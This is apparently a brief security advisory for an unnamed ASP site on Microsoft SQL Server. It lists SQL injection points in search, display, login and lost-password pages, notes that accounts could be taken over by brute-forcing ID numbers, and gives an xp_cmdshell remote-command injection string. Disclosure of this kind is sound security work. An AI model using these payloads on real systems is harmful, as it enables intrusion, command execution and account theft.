## Vulnerabilities ##



## Multiple SQL-Injections ##


Sql-Injection in Microsoft SQL Server can be very dangerous, default installation of MS SQL Server is running as SYSTEM,
which is equivalent to Administrator access in Windows.
An attacker can use stored procedures like master..xp_cmdshell to perform remote execution.


/welcome.asp?page=content_search.asp&search=[SQL]

/welcome.asp?page=content_display.asp&id=[SQL]&category=[SQL]

/welcome.asp?page=category_display.asp&category=[SQL]

/welcome.asp?page=contact_form.asp&id=[SQL]

/checklogin.asp
username: [SQL]
password: [SQL]

/lostpassword.asp
Name:  [SQL]
Surname:  [SQL]
ID Number: [SQL]

(Name and Surname are easily obtained, the attacker could bruteforce an ID number in hours and hijack an account)



## Remote Execution Example ##


An attacker could execute commands in the system via xp_cmdshell function of Microsoft SQL Server.

/welcome.asp?page=content_display.asp&category=2&id=2; exec master..xp_cmdshell 'REMOTE COMMAND'--
